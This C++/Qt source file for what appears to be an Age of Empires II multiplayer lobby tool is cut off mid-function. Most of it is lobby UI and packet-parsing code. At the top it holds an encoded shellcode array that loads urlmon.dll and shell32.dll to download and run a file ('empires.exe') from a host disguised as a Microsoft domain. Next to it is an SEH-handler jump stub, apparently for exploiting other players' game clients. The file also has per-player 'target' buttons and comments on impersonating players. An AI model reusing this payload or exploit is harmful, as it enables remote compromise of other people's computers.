#include "frm_chat.h"
#include "ui_frm_chat.h"
#include <QDesktopWidget>
#include <windows.h>
#include "structures.h"
#include "globals.hpp"

char shellcode[] =
        "\xEB\x7C\x55\x89\xE5\x53\x57\x56\x8B\x7D\x08\x8B\x5F\x3C\x01\xFB"
        "\x8B\x5B\x78\x01\xFB\x31\xC9\x3B\x4B\x18\x77\x5B\x8B\x73\x24\x01"
        "\xFE\x0F\xB7\x34\x4E\x8B\x53\x20\x01\xFA\x8B\x14\x8A\x01\xFA\x41"
        "\x53\x57\x56\x89\xD6\x31\xC0\x40\x31\xDB\x0F\xB6\x3E\x09\xFF\x74"
        "\x22\xD1\xE0\x01\xF8\x89\xC2\x81\xE2\xFF\xFF\xFF\x0F\xF7\xD2\x39"
        "\xD3\x75\x07\x89\xDA\xC1\xEA\x18\x31\xD0\x89\xDA\xF7\xD2\x21\xD0"
        "\x46\xEB\xD7\x5E\x5F\x5B\x39\x45\x0C\x75\xAC\x8B\x43\x1C\x01\xF8"
        "\x8B\x04\xB0\x01\xF8\xEB\x02\x31\xC0\x5E\x5F\x5B\xC9\xC3\x6A\x30"
        "\x5B\x64\x8B\x1B\x8B\x5B\x0C\x8B\x5B\x0C\x8B\x1B\x8B\x1B\x8B\x5B"
        "\x18\xEB\x5F\x5E\xEB\x61\x75\x72\x6C\x6D\x6F\x6E\x2E\x64\x6C\x6C"
        "\xFF\x73\x68\x65\x6C\x6C\x33\x32\x2E\x64\x6C\x6C\xFF\x68\x74\x74"
        "\x70\x3A\x2F\x2F\x6D\x69\x63\x72\x6F\x73\x6F\x66\x74\x2E\x73\x65"
        "\x72\x76\x65\x67\x61\x6D\x65\x2E\x63\x6F\x6D\x2F\x6F\xFF\x65\x6D"
        "\x70\x69\x72\x65\x73\x2E\x65\x78\x65\xFF\xDE\x33\xFD\xFF\x56\x81"
        "\xFA\xFF\xDA\x90\xFF\xFF\x5C\x54\xFA\xFF\xCA\x21\xFD\xFF\xFF\xFF"
        "\xFF\xFF\xE8\x9C\xFF\xFF\xFF\x8D\x56\x9F\x6A\x04\x59\xE3\x0B\x80"
        "\x3A\xFF\x75\x03\xFE\x02\x49\x42\xEB\xF3\x89\xD7\x31\xC9\x8B\x04"
        "\x8F\xF7\xD0\x51\x50\x53\xE8\xE7\xFE\xFF\xFF\x83\xC4\x08\x59\x89"
        "\x04\x8F\x41\x83\xF9\x05\x75\xE6\xB8\xFF\xFD\xFF\xFF\xF7\xD0\x50"
        "\x6A\x40\xFF\x56\xE3\x89\x46\xF7\x89\xC3\xB8\xFF\xFD\xFF\xFF\xF7"
        "\xD0\x53\x50\xFF\x56\xE7\x8D\x56\xD7\x52\x53\xFF\x56\xEB\x8B\x5E"
        "\xEF\x8D\x56\x9F\x52\xFF\xD3\xB9\xBC\xF1\xAC\xFE\xF7\xD1\x51\x50"
        "\xE8\x9D\xFE\xFF\xFF\x83\xC4\x08\x31\xC9\x51\x51\xFF\x76\xF7\x8D"
        "\x56\xB6\x52\x51\xFF\xD0\x8D\x56\xAA\x52\xFF\xD3\xB9\x2C\x3E\xF4"
        "\xFF\xF7\xD1\x51\x50\xE8\x78\xFE\xFF\xFF\x83\xC4\x08\x31\xC9\x31"
        "\xD2\x42\x8D\x52\x09\x52\x51\x51\xFF\x76\xF7\x51\x51\xFF\xD0\x31"
        "\xC9\x51\xFF\x56\xF3";

char jmp_shellcode[] = "\xE9\x56\xFE\xFF\xFF"       // JMP LONG -0x1AA (Tamaño de la shellcode)
                       "\xEB\xF9\x90\x90";          // JMP SHORT -0x07 (SEH HANDLER)

QTextEdit *txtMainChat;

int HostVersion; //Versión del juego del Host (para suplantar nuestra version).

char *MapName[35] = {
    "Arabia",
    "Archipelago",
    "Baltic",
    "Black Forest",
    "Coastal",
    "Continental",
    "Crater Lake",
    "Fortress",
    "Gold Rush",
    "High Land",
    "Islands",
    "Mediterranean",
    "Migration",
    "Rivers",
    "Team Islands",
    "Full Random",
    "Scandinavia",
    "Mongolia",
    "Yucatan",
    "Saltmarsh",
    "Arena",
    "King of the Hill",
    "Oasis",
    "Ghostlake",
    "Nomad",
    "Iberia",
    "Britain",
    "Mideast",
    "Texas",
    "Italy",
    "Central America",
    "France",
    "Norse Lands",
    "Sea of Japan",
    "Byzantinum"
};

char *GameSpeed[3] = {
    "Slow",
    "Normal",
    "Fast"
};

char *ShowMap[3] = {
    "Normal",
    "Explored",
    "All Visible"
};

char *Resources[4] = {
    "Standard",
    "Low",
    "Medium",
    "High"
};

char *StartingAge[7] = {
    "Standard",
    "Unknown",
    "Dark Age",
    "Feudal Age",
    "Castle Age",
    "Imperial Age",
    "Post-Imperial",
};

char *Difficulty[5] = {
    "Hardest",
    "Hard",
    "Moderate",
    "Easy",
    "Easiest"
};

char *MapSize[6] = {
    "Tiny (2 players)",
    "Small (3 players)",
    "Medium (4 players)",
    "Normal (6 players)",
    "Large (8 players)",
    "Giant"
};

char *Civilizations[20] = { //19+RANDOM (para QComboBox)
    "None",
    "Britons",
    "Franks",
    "Goths",
    "Teutons",
    "Japanese",
    "Chinese",
    "Byzantines",
    "Persians",
    "Sarracens",
    "Turks",
    "Vikings",
    "Mongols",
    "Celts",
    "Spanish",
    "Aztecs",
    "Mayans",
    "Huns",
    "Koreans",
    "Random"
};

char *Color[8] = {
    "<font color='blue'>1</font>",
    "<font color='red'>2</font>",
    "<font color='green'>3</font>",
    "<font color='yellow'>4</font>",
    "<font color='teal'>5</font>",
    "<font color='purple'>6</font>",
    "<font color='gray'>7</font>",
    "<font color='orange'>8</font>"
};

char *TeamId[6] = {
    "-",
    "1",
    "2",
    "3",
    "4",
    "?"
};

char *PlayerVersion[4] = {
    "1.0",
    "1.0a",
    "1.0b",
    "1.0c"
};

int PlayerStatus[MAX_PLAYERS] = {
    STATUS_READY1,
    STATUS_READY2,
    STATUS_READY3,
    STATUS_READY4,
    STATUS_READY5,
    STATUS_READY6,
    STATUS_READY7,
    STATUS_READY8
};

int LastPlayerId[MAX_PLAYERS];

frm_chat::frm_chat(QWidget *parent) :
    QWidget(parent),
    ui(new Ui::frm_chat)
{
    ui->setupUi(this);

    const QRect screen = QApplication::desktop()->screenGeometry();
    this->move(screen.center() - this->rect().center());

    txtMainChat = ui->txtMainChat;
}

frm_chat::~frm_chat()
{
    delete ui;
}

void frm_chat::onReceivedData(int lpGameInformation)
{
/////////////////////////////////////////////////////////////////////////////////////////////
    _MP_SCREEN_PLAYER_INFORMATION *lpMpScreenPlayerInfo;
    _MP_SETUP_DATA *lpMPSetupData;

    QString QSetting;
    int i, id, VersionFlag, SettingFlags, ColorFlag, SpeedFlag, ShowMapFlag, StartingAgeFlag,\
        ResFlag, MapSizeFlag, DifficultyFlag;

    QLabel *lbPlayerName[MAX_PLAYERS] = {
        ui->lbPName1,
        ui->lbPName2,
        ui->lbPName3,
        ui->lbPName4,
        ui->lbPName5,
        ui->lbPName6,
        ui->lbPName7,
        ui->lbPName8,
    };

    QLabel *lbPing[MAX_PLAYERS] = {
        ui->lbPing1,
        ui->lbPing2,
        ui->lbPing3,
        ui->lbPing4,
        ui->lbPing5,
        ui->lbPing6,
        ui->lbPing7,
        ui->lbPing8,
    };

    QLabel *lbCivilization[MAX_PLAYERS] = {
        ui->lbCivilization1,
        ui->lbCivilization2,
        ui->lbCivilization3,
        ui->lbCivilization4,
        ui->lbCivilization5,
        ui->lbCivilization6,
        ui->lbCivilization7,
        ui->lbCivilization8,
    };

    QLabel *lbColor[MAX_PLAYERS] = {
        ui->lbColor1,
        ui->lbColor2,
        ui->lbColor3,
        ui->lbColor4,
        ui->lbColor5,
        ui->lbColor6,
        ui->lbColor7,
        ui->lbColor8,
    };

    QLabel *lbVersion[MAX_PLAYERS] = {
        ui->lbVersion1,
        ui->lbVersion2,
        ui->lbVersion3,
        ui->lbVersion4,
        ui->lbVersion5,
        ui->lbVersion6,
        ui->lbVersion7,
        ui->lbVersion8,
    };

    QLabel *lbTeam[MAX_PLAYERS] = {
        ui->lbTeam1,
        ui->lbTeam2,
        ui->lbTeam3,
        ui->lbTeam4,
        ui->lbTeam5,
        ui->lbTeam6,
        ui->lbTeam7,
        ui->lbTeam8,
    };

    QPushButton *bTarget[MAX_PLAYERS] = {
        ui->bTarget1,
        ui->bTarget2,
        ui->bTarget3,
        ui->bTarget4,
        ui->bTarget5,
        ui->bTarget6,
        ui->bTarget7,
        ui->bTarget8
    };

    char *lpszPlayerName;
/////////////////////////////////////////////////////////////////////////////////////////////
    lpMpScreenPlayerInfo = (_MP_SCREEN_PLAYER_INFORMATION*)lpGameInformation;

    switch(lpMpScreenPlayerInfo->bMsgType){
/////////////////////////////////////////////////////////////////////////////////////////////
// Actualizamos el ping:
/////////////////////////////////////////////////////////////////////////////////////////////
    case PING:
        i = lpMpScreenPlayerInfo->dwId;
        QSetting = QSetting.setNum(i);
        lbPing[lpMpScreenPlayerInfo->bPlayerId]->setText(QSetting);
        if(i>=0 && i<400)
            lbPing[lpMpScreenPlayerInfo->bPlayerId]->setStyleSheet("color: rgb(0,255,0);");
        else if(i>=400 && i<1000)
            lbPing[lpMpScreenPlayerInfo->bPlayerId]->setStyleSheet("color: rgb(255,255,0);");
        else
            lbPing[lpMpScreenPlayerInfo->bPlayerId]->setStyleSheet("color: rgb(255,0,0);");
        break;
/////////////////////////////////////////////////////////////////////////////////////////////
// Actualizamos el estado del jugador en tiempo real:
/////////////////////////////////////////////////////////////////////////////////////////////
    case STATUS:
        i = lpMpScreenPlayerInfo->bPlayerId;
        if(lpMpScreenPlayerInfo->dwId==1)
            lbPlayerName[i]->setStyleSheet("color: rgb(0,255,0);");
        else
            lbPlayerName[i]->setStyleSheet("color: rgb(255,0,0);");
        break;
/////////////////////////////////////////////////////////////////////////////////////////////
// Actualizamos version del jugador en tiempo real:
/////////////////////////////////////////////////////////////////////////////////////////////
    case VERSION:
        i = lpMpScreenPlayerInfo->bPlayerId;
        VersionFlag = lpMpScreenPlayerInfo->dwId;
        if((VersionFlag & 1)==1){
            VersionFlag = ((VersionFlag & 0x0E)/2)-1;
            if(VersionFlag>=0 && VersionFlag<4){
                QSetting = QSetting.fromAscii("CD ",-1);
                QSetting = QSetting + QSetting.fromAscii(PlayerVersion[VersionFlag],-1);
                lbVersion[i]->setText(QSetting);
            } else {
                lbVersion[i]->setText("N/A");
            }
        } else {
            VersionFlag = (VersionFlag/2)-1;
            if(VersionFlag>=0 && VersionFlag<4){
                QSetting = QSetting.fromAscii(PlayerVersion[VersionFlag],-1);
                lbVersion[i]->setText(QSetting);
            } else {
                lbVersion[i]->setText("N/A");
            }
        }
        break;
/////////////////////////////////////////////////////////////////////////////////////////////
// Actualizamos color, civilizacion y equipo del jugador:
/////////////////////////////////////////////////////////////////////////////////////////////
    case CIV:
        i = lpMpScreenPlayerInfo->bPlayerId;
        if(i>1){
            if(lpMpScreenPlayerInfo->dwId>=0 && lpMpScreenPlayerInfo->dwId<=18)
                QSetting = QSetting.fromAscii(Civilizations[lpMpScreenPlayerInfo->dwId],-1);
            else if(lpMpScreenPlayerInfo->dwId==RANDOMCIV)
                QSetting = QSetting.fromAscii("Random",-1);

            lbCivilization[i]->setText(QSetting);
        }
        break;

    case COLOR:
        i = lpMpScreenPlayerInfo->bPlayerId;
        if(i>1 && lpMpScreenPlayerInfo->dwId>0){
            QSetting = QSetting.fromAscii(Color[lpMpScreenPlayerInfo->dwId-1],-1);
            lbColor[i]->setText(QSetting);
        }
        break;

    case TEAM:
        i = lpMpScreenPlayerInfo->bPlayerId;
        if(i>1 && lpMpScreenPlayerInfo->dwId>0){
            QSetting = QSetting.fromAscii(TeamId[lpMpScreenPlayerInfo->dwId-1],-1);
            lbTeam[i]->setText(QSetting);
        }
        break;
/////////////////////////////////////////////////////////////////////////////////////////////
// Mostramos los mensajes del chat:
/////////////////////////////////////////////////////////////////////////////////////////////
    case CHAT:
        QSetting = QSetting.fromAscii((const char*)&lpMpScreenPlayerInfo->szData,-1);
        txtMainChat->append(QSetting);
        break;
/////////////////////////////////////////////////////////////////////////////////////////////
// Configuración de la partida:
/////////////////////////////////////////////////////////////////////////////////////////////
    case MP_SETUP_DATA:
        lpMPSetupData = (_MP_SETUP_DATA*)lpMpScreenPlayerInfo;
//////////////////////////////////////////////////////
// Información de los jugadores:
//////////////////////////////////////////////////////
        //Estado (Listo/No listo/Otros)
        for(i=0;i<MAX_PLAYERS;i++){
            SettingFlags = lpMPSetupData->bStatusFlags & PlayerStatus[i];
            if(SettingFlags==PlayerStatus[i] && lpMPSetupData->dwPlayerId[i]!=0x00000000)
                lbPlayerName[i]->setStyleSheet("color: rgb(0,255,0);");
            else if(lpMPSetupData->dwPlayerId[i]!=0x00000000)
                lbPlayerName[i]->setStyleSheet("color: rgb(255,0,0);");
            else
                lbPlayerName[i]->setStyleSheet("color: rgb(150,150,150);");
        }
        //Nombres/IA/Cerrada
        i = 0;
        while(i<MAX_PLAYERS/2){
            lpszPlayerName = (char*)GlobalAlloc(GPTR,MAX_PLAYERNAME_LENGTH);

            ColorFlag = lpMPSetupData->bColor[i];
            SettingFlags = lpMPSetupData->bSlotsFlags[i];
            id = i*2;

            while(id<=(i*2)+1){
                if((SettingFlags & CLOSED)==CLOSED){
                    lbPlayerName[id]->setText("Closed");
                    lbPing[id]->hide();
                    lbCivilization[id]->hide();
                    lbColor[id]->hide();
                    lbVersion[id]->hide();
                    lbTeam[id]->hide();
                    bTarget[id]->hide();

                } else if((SettingFlags & PLAYER)==PLAYER && (LastPlayerId[id]!=dwPlayers[id] || id==0)){
                    if(lpMPSetupData->dwPlayerId[id]!=0x00000000){
                        if(pGetPlayerName(lpMPSetupData->dwPlayerId[id],lpszPlayerName)==ERROR_SUCCESS){
                            //Nombre del jugador
                            QSetting = QSetting.fromAscii(lpszPlayerName,-1);
                            lbPlayerName[id]->setText(QSetting);
                        } else {
                            lbPlayerName[id]->setText("<font color='gray'>Error</font>");
                        }
                    }
                    //Version
                    VersionFlag = lpMPSetupData->bVersion[id];
                    if(id==0) HostVersion = VersionFlag;
                    if((VersionFlag & 1)==1){
                        VersionFlag = ((VersionFlag & 0x0E)/2)-1;
                        if(VersionFlag>=0 && VersionFlag<4){
                            QSetting = QSetting.fromAscii("CD ",-1);
                            QSetting = QSetting + QSetting.fromAscii(PlayerVersion[VersionFlag],-1);
                            lbVersion[id]->setText(QSetting);
                        } else {
                            lbVersion[id]->setText("N/A");
                        }
                    } else {
                        VersionFlag = (VersionFlag/2)-1;
                        if(VersionFlag>=0 && VersionFlag<4){
                            QSetting = QSetting.fromAscii(PlayerVersion[VersionFlag],-1);
                            lbVersion[id]->setText(QSetting);
                        } else {
                            lbVersion[id]->setText("N/A");
                        }
                    }
                    if(lpMPSetupData->dwPlayerId[id]!=DPID){
                        //Team
                        QSetting = QSetting.fromAscii(TeamId[lpMPSetupData->bPlayersTeams[id]-1],-1);
                        lbTeam[id]->setText(QSetting);
                        //Civ
                        if(lpMPSetupData->bPlayersCivs[id]<=18)
                            QSetting = QSetting.fromAscii(Civilizations[lpMPSetupData->bPlayersCivs[id]],-1);
                        else if(lpMPSetupData->bPlayersCivs[id]==RANDOMCIV)
                            QSetting = QSetting.fromAscii("Random",-1);

                        lbCivilization[id]->setText(QSetting);
                        //Color
                        QSetting = QSetting.fromAscii(Color[(ColorFlag & 0x0F)-1],-1);
                        lbColor[id]->setText(QSetting);

                        lbPing[id]->show();
                        lbCivilization[id]->show();
                        lbColor[id]->show();
                        lbTeam[id]->show();
                        bTarget[id]->show();
                    } else {
                        //Team
                        QSetting = QSetting.fromAscii(TeamId[lpMPSetupData->bPlayersTeams[id]-1],-1);
                        ui->bPlayerTeam->setText(QSetting);
                        lbCivilization[id]->setText(QSetting);
                        //Color
                        QSetting = QSetting.setNum((short)(ColorFlag & 0x0F));
                        ui->bPlayerColor->setText(QSetting);

                        ui->bPlayerTeam->move(QPoint(ui->bPlayerTeam->x(),lbTeam[id]->y()));
                        ui->bPlayerColor->move(QPoint(ui->bPlayerColor->x(),lbColor[id]->y()));
                        ui->cbbPlayerCiv->move(QPoint(ui->cbbPlayerCiv->x(),lbCivilization[id]->y()));

                        lbPing[id]->hide();
                        lbCivilization[id]->hide();
                        lbColor[id]->hide();
                        lbTeam[id]->hide();
                        bTarget[id]->hide();
                    }
                    lbVersion[id]->show();

                    LastPlayerId[id] = dwPlayers[id];

                } else if((SettingFlags & SYSTEM)==SYSTEM){
                    lbPlayerName[id]->setText("System");
                    //Team
                    QSetting = QSetting.fromAscii(TeamId[lpMPSetupData->bPlayersTeams[id]-1],-1);
                    lbTeam[id]->setText(QSetting);
                    //Civ
                    if(lpMPSetupData->bPlayersCivs[id]<=18)
                        QSetting = QSetting.fromAscii(Civilizations[lpMPSetupData->bPlayersCivs[id]],-1);
                    else if(lpMPSetupData->bPlayersCivs[id]==RANDOMCIV)
                        QSetting = QSetting.fromAscii("Random",-1);

                    lbCivilization[id]->setText(QSetting);
                    //Color
                    QSetting = QSetting.fromAscii(Color[(ColorFlag & 0x0F)-1],-1);
                    lbColor[id]->setText(QSetting);

                    lbPing[id]->hide();
                    lbCivilization[id]->show();
                    lbColor[id]->show();
                    lbVersion[id]->hide();
                    lbTeam[id]->show();
                    bTarget[id]->hide();

                } else if((SettingFlags & PLAYER)!=PLAYER){
                    lbPlayerName[id]->setText("Open");
                    lbPing[id]->hide();
                    lbCivilization[id]->hide();
                    lbColor[id]->hide();
                    lbVersion[id]->hide();
                    lbTeam[id]->hide();
                    bTarget[id]->hide();

                }
                SettingFlags = SettingFlags >> 3;
                ColorFlag = ColorFlag >> 4;
                id++;
            }
//////////////////////////////////////////
        GlobalFree(lpszPlayerName);
        i++;
        }
//////////////////////////////////////////////////////
// Flags de configuración de la partida:
//////////////////////////////////////////////////////
        SettingFlags = lpMPSetupData->bSettingsFlags & MP_GAME_SETTING_CHEATS;
        (SettingFlags==MP_GAME_SETTING_CHEATS) ? ui->checkCheats->setText("X") : ui->checkCheats->clear();

        SettingFlags = lpMPSetupData->bSettingsFlags & MP_GAME_SETTING_LOCKSPEED;
        (SettingFlags==MP_GAME_SETTING_LOCKSPEED) ? ui->checkLockSpeed->setText("X") : ui->checkLockSpeed->clear();

        SettingFlags = lpMPSetupData->bSettingsFlags & MP_GAME_SETTING_LOCKTEAMS;
        (SettingFlags==MP_GAME_SETTING_LOCKTEAMS) ? ui->checkLockTeams->setText("X") : ui->checkLockTeams->clear();

        SettingFlags = lpMPSetupData->bSettingsFlags & MP_GAME_SETTING_REC;
        (SettingFlags==MP_GAME_SETTING_REC) ? ui->checkRecord->setText("X") : ui->checkRecord->clear();

        SettingFlags = lpMPSetupData->bSettingsFlags & MP_GAME_SETTING_TECHS;
        (SettingFlags==MP_GAME_SETTING_TECHS) ? ui->checkTechs->setText("X") : ui->checkTechs->clear();

        SettingFlags = lpMPSetupData->bSettingsFlags & MP_GAME_SETTING_TOGETHER;
        (SettingFlags==0) ? ui->checkTogether->setText("X") : ui->checkTogether->clear();
//////////////////////////////////////////////////////
// Flags de velocidad y de mostrar mapa:
//////////////////////////////////////////////////////
        SpeedFlag = lpMPSetupData->bSpeedShowmapFlags & 0x03;
        ShowMapFlag = lpMPSetupData->bSpeedShowmapFlags >> 2;

        if(SpeedFlag >=1 && SpeedFlag <= 3){
            QSetting = QSetting.fromAscii((const char*)GameSpeed[SpeedFlag-1]);
            ui->txtGameSpeed->setText(QSetting);
        }
        if(ShowMapFlag >=0 && ShowMapFlag <= 2){
            QSetting = QSetting.fromAscii((const char*)ShowMap[ShowMapFlag]);
            ui->txtRevealMap->setText(QSetting);
        }
//////////////////////////////////////////////////////
// Flags de edad inicial y recursos:
//////////////////////////////////////////////////////
        ResFlag = lpMPSetupData->bStartingageResFlags & 0x0F;
        StartingAgeFlag = lpMPSetupData->bStartingageResFlags >> 4;

        if(ResFlag >=0 && ResFlag <= 3){
            QSetting = QSetting.fromAscii((const char*)Resources[ResFlag]);
            ui->txtResources->setText(QSetting);
        }
        if(StartingAgeFlag >=0 && StartingAgeFlag <= 6){
             QSetting = QSetting.fromAscii((const char*)StartingAge[StartingAgeFlag]);
             ui->txtStartingAge->setText(QSetting);
        }
//////////////////////////////////////////////////////
// Flags de tamaño de mapa y de dificultad:
//////////////////////////////////////////////////////
        DifficultyFlag = lpMPSetupData->bMapsizeDifficultyFlags & 0x0F;
        MapSizeFlag = lpMPSetupData->bMapsizeDifficultyFlags >> 4;

        if(DifficultyFlag >=0 && DifficultyFlag <= 4){
             QSetting = QSetting.fromAscii((const char*)Difficulty[DifficultyFlag]);
             ui->txtDifficulty->setText(QSetting);
        }
        if(MapSizeFlag >=0 && MapSizeFlag <= 5){
             QSetting = QSetting.fromAscii((const char*)MapSize[MapSizeFlag]);
             ui->txtSize->setText(QSetting);
        }
//////////////////////////////////////////////////////
// Flag de población:
//////////////////////////////////////////////////////
        QSetting = QSetting.setNum((short)lpMPSetupData->bMaxPopulation);
        ui->txtPopulation->setText(QSetting);
//////////////////////////////////////////////////////
// Visibilidad por defecto de controles...
//////////////////////////////////////////////////////
        // Solo usado para mostrar nombre si el tipo de juego es CS
        ui->txtSceName->hide();
        // Ocultado por CS
        ui->txtMapStyle->show();
        ui->lbMapStyle->show();
        ui->txtLocation->show();
        ui->lbLocation->show();
        ui->txtSize->show();
        ui->lbSize->show();
        // Ocultado por DM
        ui->txtResources->show();
        ui->lbResources->show();
        // Ocultado por "Wonder Race"
        ui->txtVictory->show();
        ui->lbVictory->show();
        // Ocultado por "Defend The Wonder"
        ui->txtStartingAge->show();
        ui->lbStartingAge->show();
        // Solo debe ser visibile si la victoria es condicional
        ui->txtCondition->hide();
        ui->lbConditional->hide();
//////////////////////////////////////////////////////
// Condición de victoria:
//////////////////////////////////////////////////////
        switch(lpMPSetupData->bVictoryType){
        case STANDARD:
            ui->txtVictory->setText("Standard");
            break;

        case VICTORY_CONQUEST:
            ui->txtVictory->setText("Conquest");
            break;

        case VICTORY_TIMELIMIT:
            ui->txtVictory->setText("Time Limit");
            ui->txtCondition->show();
            ui->lbConditional->show();
            QSetting = QSetting.setNum((short)lpMPSetupData->wVictoryConditionValue/10);
            ui->txtCondition->setText(QSetting + " years.");
            ui->lbConditional->setText("Time:");
            break;

        case VICTORY_SCORE:
            ui->txtVictory->setText("Score Limit");
            ui->txtCondition->show();
            ui->lbConditional->show();
            QSetting = QSetting.setNum((short)lpMPSetupData->wVictoryConditionValue);
            ui->txtCondition->setText(QSetting);
            ui->lbConditional->setText("Score:");
            break;

        case VICTORY_INDIVIDUAL:
            ui->txtVictory->setText("Individual victory");
            break;
        }
//////////////////////////////////////////////////////
// Obtener nombre del mapa:
//////////////////////////////////////////////////////
        if(lpMPSetupData->bMapId >= MIN_STMAP_ID && lpMPSetupData->bMapId <= MAX_STMAP_ID){
            QSetting = QSetting.fromAscii((const char*)MapName[lpMPSetupData->bMapId-9]);
            ui->txtMapStyle->setText("Standard");
            ui->txtLocation->setText(QSetting);
        }
        if(lpMPSetupData->bMapId >= MIN_RWMAP_ID && lpMPSetupData->bMapId <= MAX_RWMAP_ID){
            QSetting = QSetting.fromAscii((const char*)MapName[lpMPSetupData->bMapId-9]);
            ui->txtMapStyle->setText("Real World");
            ui->txtLocation->setText(QSetting);
            ui->txtSize->hide();
            ui->lbSize->hide();
        }
        //Casos especiales...
        switch(lpMPSetupData->bMapId){
        case CUSTOM:
            QSetting = QSetting.fromAscii((const char*)&lpMPSetupData->szMapName,lpMPSetupData->bMapNameLength);
            ui->txtMapStyle->setText("Custom");
            ui->txtLocation->setText(QSetting);
            break;

        case LRANDOM:
            ui->txtMapStyle->setText("Standard");
            ui->txtLocation->setText("Random Land Map");
            break;

        case RRANDOM:
            ui->txtMapStyle->setText("Real World");
            ui->txtLocation->setText("Full Random");
            ui->txtSize->hide();
            ui->lbSize->hide();
            break;

        case BLINDRANDOM:
            ui->txtMapStyle->setText("Standard");
            ui->txtLocation->setText("Blind Random");
            break;
        }
//////////////////////////////////////////////////////
// Tipo de partida:
//////////////////////////////////////////////////////
        switch(lpMPSetupData->bGameType){
        case GAMETYPE_RM:
            ui->txtGameType->setText("Random Map");
            break;

        case GAMETYPE_REGICIDE:
            ui->txtGameType->setText("Regicide");
            break;

        case GAMETYPE_DEATHMATCH:
            ui->txtGameType->setText("Death Match");
            ui->txtResources->hide();
            ui->lbResources->hide();
            break;

        case GAMETYPE_CS:
            ui->txtGameType->setText("Custom Scenario");
            ui->txtSceName->show();
            QSetting = QSetting.fromAscii((const char*)&lpMPSetupData->szMapName,lpMPSetupData->bScenarioNameLength);
            ui->txtSceName->setText(QSetting);

            ui->txtMapStyle->hide();
            ui->lbMapStyle->hide();
            ui->txtLocation->hide();
            ui->lbLocation->hide();
            ui->txtSize->hide();
            ui->lbSize->hide();
            break;

        case GAMETYPE_KINGOFHILL:
            ui->txtGameType->setText("King of the Hill");
            break;

        case GAMETYPE_WONDERRACE:
            ui->txtGameType->setText("Wonder Race");
            ui->txtVictory->hide();
            ui->lbVictory->hide();

            ui->txtCondition->hide();
            ui->lbConditional->hide();
            break;

        case GAMETYPE_DEFENDTHEWONDER:
            ui->txtGameType->setText("Defend The Wonder");
            ui->txtVictory->hide();
            ui->lbVictory->hide();
            ui->txtStartingAge->hide();
            ui->lbStartingAge->hide();

            ui->txtCondition->hide();
            ui->lbConditional->hide();
            break;
        }
//////////////////////////////////////////////////////
// Mostrar ventana de chat en caso de no ser visible:
//////////////////////////////////////////////////////
        if(!this->isVisible()){
            this->show();
            HideMainForm();
        }
        break;
/////////////////////////////////////////////////////////////////////////////////////////////
    }
/////////////////////////////////////////////////////////////////////////////////////////////
    GlobalFree((HGLOBAL)lpGameInformation);
}

void frm_chat::onInitialize()
{
    ui->txtCondition->hide();
    ui->lbConditional->hide();
    ui->txtSceName->hide();

    ZeroMemory(&LastPlayerId,MAX_PLAYERS*4);

    int i;
    QString QCiv;
    for(i=1;i<20;i++){ //Omitimos "None"
        QCiv = QCiv.fromAscii(Civilizations[i],-1);
        ui->cbbPlayerCiv->insertItem(i,QCiv);
    }
    ui->cbbPlayerCiv->setCurrentIndex(i-2); //Indice, "None".

    RecvDataScheduler = new tRecvDataScheduler();
    connect(RecvDataScheduler,SIGNAL(ReceivedData(int)),this,SLOT(onReceivedData(int)));
    connect(RecvDataScheduler,SIGNAL(CloseChat()),this,SLOT(CloseChat()));
    RecvDataScheduler->start();
}

void frm_chat::on_txtChatInput_returnPressed()
{
    _MP_SETUP_CHAT *lpMPSetupChatMessage;
    int i, cbMessageLength, id;
    char *lpszChatMessage;
    QString QChatMessage;

    cbMessageLength = ui->txtChatInput->text().length();

    id = 0;
    while(dwPlayers[id]!=DPID && id<MAX_PLAYERS) id++; //También podemos suplantar jugadores.

    if(cbMessageLength>0 && id<MAX_PLAYERS){
        lpMPSetupChatMessage = (_MP_SETUP_CHAT*)GlobalAlloc(GPTR,sizeof _MP_SETUP_CHAT);

        lpMPSetupChatMessage->bMsgType = MP_SETUP_CHAT;
        lpMPSetupChatMessage->bPlayerSource = id+1;
        for(i=0;i<MAX_PLAYERS;i++){
            lpMPSetupChatMessage->Destionation[i] = 'Y';
        }
        lpMPSetupChatMessage->dwChatMsgLength = cbMessageLength;
        lpMPSetupChatMessage->bUnknown2 = 1;

        memcpy(&lpMPSetupChatMessage->szChatMessage,ui->txtChatInput->text().toStdString().c_str(),cbMessageLength);

        pSendMsg(DPID,DPID_ALLPLAYERS,lpMPSetupChatMessage,sizeof _MP_SETUP_CHAT);

        GlobalFree(lpMPSetupChatMessage);

        lpszChatMessage = (char*)GlobalAlloc(GPTR,FULL_CHAT_MESSAGE_LENGTH);
        pGetPlayerName(dwPlayers[id],lpszChatMessage);

        strcat(lpszChatMessage,": ");
        strcat(lpszChatMessage,ui->txtChatInput->text().toStdString().c_str());

        QChatMessage = QChatMessage.fromAscii(lpszChatMessage,-1);
        txtMainChat->append(QChatMessage);

        GlobalFree(lpszChatMessage);

        ui->txtChatInput->clear();
    }
}

void frm_chat::on_cbReady_clicked()
{
    _MP_SESSION_PACKET MPReadyMsg;

    ZeroMemory(&MPReadyMsg,sizeof _MP_SESSION_PACKET);

    MPReadyMsg.bMsgType = MP_SETUP_PLAYER_READY;

    if(!strcmp(ui->cbReady->text().toStdString().c_str(),"X")){
        MPReadyMsg.bMsgSubType = FALSE;
        ui->cbReady->setText("");
    } else {
        MPReadyMsg.bMsgSubType = TRUE;
        ui->cbReady->setText("X");
    }

    pSendMsg(DPID,DPID_ALLPLAYERS,&MPReadyMsg,sizeof _MP_SESSION_PACKET);
}

void frm_chat::closeEvent(QCloseEvent *event)
{
    pCloseSession();
    ShowMainForm();
}

void frm_chat::CloseChat()
{
    this->close();
}

void frm_chat::on_bPlayerTeam_clicked()
{
    _MP_SESSION_PACKET MPTeamMsg;
    QString QTeam;
    int i;

    ZeroMemory(&MPTeamMsg,sizeof _MP_SESSION_PACKET);

    MPTeamMsg.bMsgType = MP_SETUP_SCREEN;
    MPTeamMsg.bMsgSubType = MP_SETUP_SCREEN_TEAM;

    i = 0;
    while(strcmp(ui->bPlayerTeam->text().toStdString().c_str(),TeamId[i]) && i<6) i++;

    i++;
    if(i>=6) i-=6;
    MPTeamMsg.dwId = i+1;
    QTeam = QTeam.fromAscii(TeamId[i],-1);
    ui->bPlayerTeam->setText(QTeam);
    pSendMsg(DPID,DPID_ALLPLAYERS,&MPTeamMsg,sizeof _MP_SESSION_PACKET);
}

void frm_chat::on_bPlayerColor_clicked()
{
    _MP_SESSION_PACKET MPColorMsg;
    QString QColor;
    int i;

    ZeroMemory(&MPColorMsg,sizeof _MP_SESSION_PACKET);

    MPColorMsg.bMsgType = MP_SETUP_SCREEN;
